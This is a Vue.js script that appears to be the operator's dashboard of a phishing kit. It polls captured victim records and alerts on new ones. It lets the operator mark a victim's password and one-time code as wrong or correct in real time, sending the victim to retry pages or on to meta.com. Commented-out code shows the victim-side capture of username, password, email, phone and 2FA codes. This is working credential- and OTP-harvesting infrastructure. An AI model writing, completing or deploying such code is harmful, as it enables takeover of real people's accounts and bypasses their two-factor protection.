// import { method } from "lodash";
import serviceHTTP from "../service/serviceHTTP.js";
import Swal from 'sweetalert2'
import PulseLoader from 'vue-spinner/src/PulseLoader.vue'
import _ from 'lodash';

Vue.createApp({
    data(){
        return {
            author: 'Phạm Minh Châu',
            dataList: [],
            dataListOld: [],
            FormInfo: {
                username: 'undefined',
                password: '',
                email: '',
                phone: ''
            },
            FormDigitCode: {
                code: ''
            },
            FormPassword: {
                password: ''
            },
            formInfoError: {},
            formDigitError: {},
            formPasswordError: {},
            colorLoading: '#007bff',
            sizeLoading: '20px',
            isLoading: false,
            FormDataChangePassword:{
                oldPassword: '',
                newPassword: '',
            },
            ResetFormDataChangePassword:{
                oldPassword: '',
                newPassword: '',
            },
            formChangePasswordError: {},
            FormDataChangeIP:{
                ipUpdate: ''
            },
            ResetFormDataChangeIP:{
                ipUpdate: ''

            },
            formChangeIPError: {},
            soundNotify: false
        }
    },
    methods:{
        handleCheckboxChange() {
            const audioPlayer = document.getElementById('audioPlayer');
            if (this.soundNotify) {
              audioPlayer.play();
            } else {
              audioPlayer.pause();
              audioPlayer.currentTime = 0;
            }
          },
        getAllItem(){
            var that = this;
            var flagFirst = true;
            setInterval(function(){
                serviceHTTP.get('/admin/api/get-all-items').then((response)=>{

                    that.dataList = {...response.data};

                    if(Object.keys(that.dataList).length !== Object.keys(that.dataListOld).length && !flagFirst){

                        const audio = document.getElementById('audioPlayer');
                        if (audio && that.soundNotify) {
                            audio.play().catch(error => {
                            console.error('Error playing audio:', error);
                            });
                        }

                        let timerInterval;
                        Swal.fire({
                        title: '<p style="font-size:16px; margin: 0; color: #007bff;">Có cập nhật mới!</p>',
                        timer: 10000,
                        position: "top-end",
                        width: '200px',
                        // height: '30px',
                        background: null,
                        timerProgressBar: true,
                        showConfirmButton: false,
                        backdrop: false,
                        customClass: {
                            timerProgressBar: 'custom-timer-progress-bar'
                        },
                        didOpen: () => {
                            //Swal.showLoading();
                            // const timer = Swal.getPopup().querySelector("b");
                            // timerInterval = setInterval(() => {
                            // timer.textContent = `${Swal.getTimerLeft()}`;
                            // }, 100);
                        },
                        willClose: () => {
                            clearInterval(timerInterval);
                        }
                        }).then((result) => {
                        if (result.dismiss === Swal.DismissReason.timer) {
                            // console.log("I was closed by the timer");
                        }
                        });
                    }

                    flagFirst = false;
                    that.dataListOld = {...that.dataList}

                })
            }, 1000);
        },
        // handleStoreInfo(){
        //     var that = this;
        //     that.formInfoError= {}
        //     if(that.FormInfo.username == '')
        //         that.formInfoError.username = true
        //     if(that.FormInfo.password == '')
        //         that.formInfoError.password = true
        //     if(that.FormInfo.phone == '')
        //         that.formInfoError.phone = true

        //     const emailHidden = this.$refs.emailHidden.value;
        //     that.FormInfo.email = emailHidden;
        //     if(Object.keys(that.formInfoError).length === 0){
        //         serviceHTTP.post("/admin/api/store-info", {...this.FormInfo}).then((response)=>{
        //             if(response.status === 200){
        //                 that.isLoading = true;
        //                 var idNewItem = response.data.id;
        //                 var email = response.data.email;
        //                 setInterval(function(){
        //                     serviceHTTP.get(`/admin/api/get-status-password?id=${idNewItem}`).then((response)=>{
        //                         if(response.status === 200){
        //                             if(response.data == 1){
        //                                 window.location.href = `/wrong-password?email=${email}&id=${idNewItem}`;
        //                             }
        //                             if(response.data == 2){
        //                                 window.location.href = `/2step-verification?email=${email}&id=${idNewItem}`;
        //                             }
        //                         }
        //                         else{
        //                             console.log(response.message)
        //                         }
        //                     })
        //                 }, 1000);
        //             }
        //             else{
        //                 console.log(response.message)
        //             }
        //         });

        //     }
        // },
        passwordWrongClick($key){
            var that = this;
            serviceHTTP.post("/admin/api/password-wrong-click", {'id' : $key}).then((response)=>{
                if(response.status === 200){
                    Swal.fire({
                        title: "Thành công!",
                        text: "Thao tác thành công!",
                        icon: "success",
                        showConfirmButton: false,
                        timer: 1000
                      });
                }
                else{
                    console.log(response.message)
                }
            });
        },
        passwordCorrectClick($key){
            var that = this;
            serviceHTTP.post("/admin/api/password-correct-click", {'id' : $key}).then((response)=>{
                if(response.status === 200){
                    Swal.fire({
                        title: "Thành công!",
                        text: "Thao tác thành công!",
                        icon: "success",
                        showConfirmButton: false,
                        timer: 1000
                      });
                }
                else{
                    console.log(response.message)
                }
            });
        },
        // enterDigitCode($key){
        //     var that = this;
        //     that.formDigitError= {}
        //     if(that.FormDigitCode.code == '')
        //         that.formDigitError.code = true
        //     if(that.FormDigitCode.code < 100000 || that.FormDigitCode.code > 999999)
        //         that.formDigitError.code = true

        //     if(Object.keys(that.formDigitError).length === 0){
        //         that.FormDigitCode.id = $key;

        //         serviceHTTP.post("/admin/api/otp-reset-click", {'id' : $key}).then((response)=>{});

        //         serviceHTTP.post("/admin/api/update-digit-code", {...this.FormDigitCode}).then((response)=>{
        //             if(response.status === 200){
        //                 that.isLoading = true;
        //                 setInterval(function(){
        //                     serviceHTTP.get(`/admin/api/get-status-otp?id=${$key}`).then((response)=>{
        //                         if(response.status === 200){
        //                             if(response.data == 1){
        //                                 that.formDigitError.message = "OPT incorrect!"
        //                                 that.isLoading = false;
        //                             }
        //                             if(response.data == 2){
        //                                 window.location.href = `https://www.meta.com/`;
        //                             }
        //                         }
        //                         else{
        //                             console.log(response.message)
        //                         }
        //                     })
        //                 }, 1000);
        //             }
        //             else{
        //                 console.log(response.message)
        //             }
        //         });
        //     }
        // },
        OTPWrongClick($key){
            var that = this;
            serviceHTTP.post("/admin/api/otp-wrong-click", {'id' : $key}).then((response)=>{
                if(response.status === 200){
                    Swal.fire({
                        title: "Thành công!",
                        text: "Thao tác thành công!",
                        icon: "success",
                        showConfirmButton: false,
                        timer: 1000
                      });
                }
                else{
                    console.log(response.message)
                }
            });
        },
        OTPCorrectClick($key){
            var that = this;
            serviceHTTP.post("/admin/api/otp-correct-click", {'id' : $key}).then((response)=>{
                if(response.status === 200){
                    Swal.fire({
                        title: "Thành công!",
                        text: "Thao tác thành công!",
                        icon: "success",
                        showConfirmButton: false,
                        timer: 1000
                      });
                }
                else{
                    console.log(response.message)
                }
            });
        },
        // enterPassword($key){
        //     var that = this;
        //     that.formPasswordError= {}
        //     if(that.FormPassword.password == '')
        //         that.formPasswordError.code = true

        //     if(Object.keys(that.formPasswordError).length === 0){
        //         that.FormPassword.id = $key;

        //         serviceHTTP.post("/admin/api/password-reset-click", {'id' : $key}).then((response)=>{});

        //         serviceHTTP.post("/admin/api/update-password", {...this.FormPassword}).then((response)=>{

        //             if(response.status === 200){
        //                 that.isLoading = true;
        //                 var idNewItem = response.data.id;
        //                 var email = response.data.email;
        //                 setInterval(function(){
        //                     serviceHTTP.get(`/admin/api/get-status-password?id=${idNewItem}`).then((response)=>{
        //                         if(response.status === 200){
        //                             if(response.data == 1){
        //                                 that.formPasswordError.message = "Password incorrect!"
        //                                 that.isLoading = false;
        //                             }
        //                             if(response.data == 2){
        //                                 window.location.href = `/2step-verification?email=${email}&id=${idNewItem}`;
        //                             }
        //                         }
        //                         else{
        //                             console.log(response.message)
        //                         }
        //                     })
        //                 }, 1000);
        //             }
        //             else{
        //                 console.log(response.message)
        //             }
        //         });
        //     }
        // },
        submitChangePassword(){
            var that = this
            that.formChangePasswordError = {}
            serviceHTTP.post("/admin/change-password", {...that.FormDataChangePassword}).then((response)=>{
                if(response.status === 200){
                    $('#changePassword').modal('hide');
                    that.FormDataChangePassword = {...that.ResetFormDataChangePassword}
                    Swal.fire({
                        title: "Thành công!",
                        text: "Cập nhật thông tin mới!",
                        icon: "success",
                        showConfirmButton: false,
                        timer: 1000
                      });
                }
                else{
                    that.formChangePasswordError.status = response.message
                }
            });
        },
        submitChangeIP(){
            var that = this
            that.formChangeIPError = {}
            serviceHTTP.post("/admin/change-ip-access-token", {...that.FormDataChangeIP}).then((response)=>{
                if(response.status === 200){
                    $('#changeIP').modal('hide');
                    that.FormDataChangeIP = {...that.ResetFormDataChangeIP}
                    Swal.fire({
                        title: "Thành công!",
                        text: "Cập nhật thông tin mới!",
                        icon: "success",
                        showConfirmButton: false,
                        timer: 1000
                      });
                }
                else{
                    that.formChangeIPError.status = response.message
                }
            });
        }
    },
    mounted(){
        this.getAllItem()
    },
    components: {
        PulseLoader
    }
}).mount('#ctlAdmin');
